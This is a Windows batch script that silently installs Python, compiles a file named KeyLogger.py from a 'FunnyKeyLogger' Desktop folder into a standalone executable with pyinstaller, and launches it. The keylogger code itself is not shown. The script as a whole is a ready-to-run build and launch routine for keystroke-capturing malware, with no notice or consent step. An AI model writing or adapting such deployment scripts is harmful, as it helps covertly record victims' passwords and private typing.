@echo off

curl https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe -o python_install.exe

python_install.exe /quiet

pip install -r requirements.txt

set desktopPath=%USERPROFILE%\Desktop

cd /d %desktopPath%\FunnyKeyLogger

pyinstaller --onefile 'KeyLogger.py'

cd /d %desktopPath%\FunnyKeyLogger\dist\

KeyLogger.exe

pause